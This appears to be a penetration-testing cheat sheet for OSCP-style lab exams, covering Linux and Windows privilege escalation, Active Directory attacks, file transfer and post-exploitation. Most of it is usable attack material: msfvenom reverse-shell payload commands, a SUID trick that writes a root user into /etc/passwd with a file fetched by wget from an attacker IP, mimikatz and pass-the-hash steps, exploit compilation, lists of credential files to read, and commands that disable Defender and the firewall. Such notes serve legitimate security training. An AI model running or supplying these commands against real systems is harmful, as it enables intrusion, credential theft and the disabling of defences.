# General tips
- If FTP is open try connecting to it with anonymous creds (anonymous / anonymous@anonymous.com)
- If it looks like it's linked to a webserver of some sort try uploading a reverse shell to the FTP server and execute it in the browser. Or maybe it'll have functionality that auto-executes uploaded files periodically.
- Browse to HTTP and HTTPS versions of the site on those other HTTP ports?
- SMB: Use enum4linux and smbclient. See if you can get usernames, groups, passwords, sensitive files, groups.xml file for password cracking, etc.
- LDAP: Use ldapsearch to find potentially sensitive info.
- Try LFIs/RFIs: If the website has upload functionality experiment with uploading webshells or reverse shells.
- if the webapp presents a page/function that works as intended, try change input to make it throw and error; we can analyse the error to find out the software used and the process behind it
- If Linpeas cannot found vulnerabilties, use linux-exploit-suggester (https://github.com/mzet-/linux-exploit-suggester)
- /dev/null is the standard Linux device where you send output that you want ignored.
- if mount point is needed, try to use /etc , so we can access /etc/passwd
- /tmp directory has all permission to create or delete any file, use it
- if SUID is set ofr a binary program and to GTFObins requires LFILE=file_to_read, we can set LFILE=/etc/shadow, and unhash the password and do a 'su' or switch user.
- If "/bin/bash" has SUID set, user can execute “bash -p” and this should allow you to run the bash as root.
- If a user can run all command as root user, we can achieve root access by performing 'sudo su' or 'sudo bash'
- always read the command flags carefully i.e. under --help
![image](https://github.com/user-attachments/assets/4b28ef51-06ae-4acc-96e3-8bcb6552cee3)
![image](https://github.com/user-attachments/assets/24447d7f-6aa7-4668-9705-3e14157570c9)

- If program/exploit cannot run, try 'chmod +x exploit' or 'chmod 777 exploit'
- if '/bin/bash' doesnt work, try '/bin/sh'
- to run binary program, can specify '/home' instead of current directory '.'
- [if SUID bit set for cp, we can add a new user with root privileges to /etc/passwd file] to create new user(name: ignite) at end of /etc/passwd, first generate the $hash value first using 'openssl passwd -1 -salt ignite pass123'. Then insert $hash into 'ignite:$hash:0:0:root:/root:/bin/bash'. Then copy the passwd file back to victim machine (/etc) using 'wget -O passwd http://192.168.1.108:8000/passwd'. Then 'su ignite' password: 'pass123', 'whoami'.
- admin to give SUID permission to nano: 'chmod u+s /bin/nano'
- if WinPEAS failed i.e. Error, try using Seatbelt
- transfer nc from kali to windows: 'locate nc.exe' then host the folder that contains nc.exe
- For Linux, search for interesting files in /home, /opt, or /
- For Windows, search for interesting files in \Documents or \Desktop
- TRY CREDS EVERYWHERE!! try default passwords admin/admin ; root/root
- IF YOUR SHELLS AREN’T WORKING TRY DIFFERENT PORTS, ARCHITECTURES, AND ENCODINGS!!
- Aim old OS versions
- decode base64 hashes: `echo "xxxxxxxxxxxxx" | base64 -d`
- Domain Controller usually has port 88/TCP kerberos-sec
- For AD enumeration run `nmap -A 192.168.1.50 -Pn`, take note of the common name of the host in AD e.g. `ssl-cert: Subject: commonName=student.pentesting.local`
- For crackmapexec, if a command failed, try another protocol e.g. smb, winrm, etc
- Root of php web server
![image](https://github.com/user-attachments/assets/49a4e874-e58c-4c07-aa12-d403a44648e1)
- if HTTP request method return error e.e. 4xx, check to another method and try. If GET method fails, try POST method
- to bypass login page `google for default credentials for the web app` or `use XX(MYSQL) bypass login seclist`

- If you found any potential services, check tasklist / ps -ef to see if they're actively running (and who is running them), and check where the file is running from
- Can you replace the binary with a reverse shell? i.e. if it's currently running, rename it, upload a reverse shell with the original binary name, start an nc listener, then type shutdown -r to reboot the box and restart the service.
- If linux, type 'sudo -l' to see if you can take advantage of any sudo commands (use GTFObins if you can sudo a command)
- Check /opt or Program Files to see if any additional third party software is installed. If so, see if there are any passwords in the configs anywhere.
- Check web server to see if any additional third party software is installed. If so, see if there are any passwords in the configs anywhere. If it's linux you should see something in /var/www/html.. Check the files in there. linpeas or winpeas should indicate whether or not there's third-party software installed.
- Always always always, Enumerate once you get the initial. believe me or not 70% of the time, the intended priv esc vector is a file in the D³ folder. I call it the Documents, Downloads, and Desktop folder.
- Just whack exploits that are meant for both older and newer version of the app that you are whacking.


- # AD Methodology
-  NMAP scan the AD set → Make note of open ports (anything that can give you remote access (SSH/RDP), webservers, FTP, AD specific ports (SMB/LDAP)
enum4linux/smbclient each box with no creds (to list shares, see what's in each accessible share, and possibly list users/groups/domain name)
-  Add domain name to "/etc/hosts" file (Medium doesn't let me type the filename without the spaces)
-  ldapsearch (start general, then dig deep. You might find users/creds/account roles)
-  Run some remote AD tools for enumeration purposes (kerbrute for username enumeration if you didn't get any through LDAP/SMB, GetNPUsers, GetUserSPNs, secretsdump, etc.)
-  Have you found users/creds yet? Try them if SSH/RDP is open, or try psexec/evil-winrm, possibly use them to log into a web portal
-  If you haven't gotten a shell yet, enumerate your initial access vectors (usually a webserver or vulnerable service), get low-priv shell (if you're lucky, maybe an administrator/system shell)
-  Typically, most AD-specific attacks (or mimikatz.exe) will be useless if you're not an elevated user. Privesc to Administrator or SYSTEM (not touching on that in this section)
-  Once you're an elevated user, enumerate.
-  Upload and execute Bloodhound (SharpHound.exe is what gets uploaded to target) for visual domain enumeration (super useful, even shows you the quickest paths to Domain Admin and who can be kerberoasted/as-rep roasted). BloodHound is also sometimes useful as a low-priv user, use it if you're stuck. Just remember to re-run it when you successfully privesc.
-  Upload mimikatz.exe (this is the money shot). Use the command cheat sheet you made from some of the TryHackMe rooms and dump creds/hashes. If nothing useful gets dumped move onto some of the other attacks like Pass-the-Ticket (PTT) or Over-Pass-the-Hash (OPTH) and try it again or try authenticating to another box's domain resources with your new ticket.
-  At this point you should have at least a few usernames, passwords, and/or hashes to run with. Use crackmapexec to test if any of these **combinations** work on the other boxes.
-  If crackmapexec (CME) comes back positive, use psexec/evil-winrm to spawn a remote shell to the box. If that doesn't work and you have valid creds, see if you can use them to SSH/RDP into the box, or maybe use these creds with smbclient and see if you can pull any sensitive data from the share (could contain passwords).
**-  Any time I get creds that I verified work on another box I'll re-run all of the remote AD tools against it with the creds (GetNPUsers, GetUserSPNs, secretsdump, etc).**
-  Once you have access to the next box do it all over again. You may get lucky and get domain admin creds from the first box, or you may have to privesc again and re-roll through the process. This is where Bloodhound comes in handy, it'll show you what permissions the accounts have that you found creds for. Some creds may work on multiple boxes, use crackmapexec to verify the creds with EVERY IP in the domain, don't stop at the first box that works. Don't forget to check the permissions/groups your current user is in. You may not find creds to another user, but your current one may have special permissions that allow you to modify access to resources, run certain processes as SYSTEM, or create new users or add them to certain groups.


# Remote Desktop
`xfreerdp /u:nelly /p:nicole1 /v:192.168.190.210`

## Enable Remote Desktop
```powershell
# Turn On
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
```

## Login with remote desktop
```bash
# Login
rdesktop 172.16.20.20 -d corporate -u username -p password
```

## Login with remote desktop with folder sharing 
```bash
# Login
rdesktop 172.16.20.20 -d corporate -u username -p password -r disk:sharename=//home/username/Desktop/Tools
```

## Login with xfreerdp
```bash
# Login
xfreerdp /u:username /p:password /v:172.16.20.20
```

## Login with xfreerdp with folder sharing 
```bash
# Login
xfreerdp /u:username /p:password /v:172.16.20.20 /drive:/home/username/Desktop/Tools
```

# MSFVenom
## Check msfvenom payloads
```bash
msfvenom -l payloads
```
##
```bash
msfconsole
use exploit/multi/handler
set lhost x.x.x.x
set Iport 4444
exploit

#windows (stageless)
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00" -f python -v shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f asp > shell.asp

#Linux (stageless)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f war > shell.war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw > shell.jsp
```
## MSFVenom Reverse Shell Payload Cheatsheet (see stageless)
- https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
- Windows file transfer only uses **FTP, powershell, certutil**
```bash 
#Non-Meterpreter Binaries

#Staged Payloads for Windows
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

#Stageless Payloads for Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

#Staged Payloads for Linux
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

#Stageless Payloads for Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

#Non-Meterpreter Web Payloads
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

## compiling windows exploit on kali
```bash
#compile C code
gcc -o syncbreeze_exploit.exe exploit.c

#compile 32 bit
apt install mingw-w64
i686-w64-mingw32-gcc /usr/share/exploitdb/exploits/windows/dos/42341.c -o syncbreeze_exploit.exe -lws2_32

#compile 64 bit
$ gcc i686-w64-mingw32-gcc exploit.c -o exploit.exe
```

## Post exploitation evidence
```bash
cat /root/proof.txt
whoami
ip a```

```bash
type local.txt
type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
systeminfo
ipconfig
```

```bash
cd\ & dir /b /s proof.txt
type c:\pathto\proof.txt
```

## Permissions
```bash
#modifying permissions
chmod 600 id_rsa
chmod a+x ./linpeas.sh
```

## ssh operations
```bash
##connect to ssh
ssh -i id_rsa daniela@192.168.50.244

##cracking ssh passphrase
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

## files of interest
- In the case where there is a LFI, and you cannot gain command execution try looking for interesting files which might contain credentials to help you move forward.

```bash
#Linux Interesting Files
/etc/passwd <- see which users are on the box
SSH keys <- using the information from above, check to see if there are any LFI keys
    - default location: /home/user/.ssh/id_rsa
/var/lib/tomcatX/tomcat-users.xml <- replace x with the tomcat version installed, and see if there are any credentias
```

```bash
#windows interesting files
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

## Useful NSE scripts
```bash
#smb-vuln-ms08-067
nmap --script-args=unsafe=1 --script smb-vuln-ms08-067.nse -p 445 <host>

#http-shellshock
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/{location},cmd=ls <target>
```

## /etc/crontab vs crontab
- /etc/crontab
  - Contains everything in one place
  - Only root can edit
  - Able to view which user is running what cron
  - /etc/crontab is public, and readable by anyone
 
- /var/spool/cron/crontab/{user}
  - Users are allowed to create their own cron jobs
  - Only root can edit crontab for user
  - Cron job is private unlike /etc/crontab

## starting and confirming SSH service
```bash
# To start it
sudo systemctl start ssh

#To confirm that the service is running
sudo ss -antlp | grep sshd
```

## port forwarding
- https://docs.gorigorisensei.com/port-forwarding

# What to do after you are Windows Admin in Powershell
- Disable realtime monitoring: `Set-MpPreference -DisableRealtimeMonitoring $true`
- Disable AV: `Set-MpPreference -DisableIOAVProtection $true`
- off states: `netsh advfirewall set allprofiles state off`

## Linux proof
- `hostname && whoami && cat proof.txt && /sbin/ifconfig`

## Windows proof
- `hostname && whoami.exe && type proof.txt && ipconfig /all`
